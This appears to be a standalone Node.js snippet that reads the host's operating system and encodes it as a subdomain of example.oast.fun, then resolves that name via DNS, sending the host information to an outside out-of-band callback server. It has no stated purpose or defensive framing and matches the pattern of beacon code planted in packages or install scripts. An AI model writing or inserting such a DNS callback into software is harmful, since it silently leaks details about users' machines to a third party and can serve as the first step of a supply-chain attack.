const dns=require('dns'), os=require('os');
const platform=os.platform();
let queryData='';
switch(platform){case 'linux': queryData='linux'; break; default: queryData='other'}
const domain=`${queryData}.example.oast.fun`;
dns.resolve(domain,()=>{});
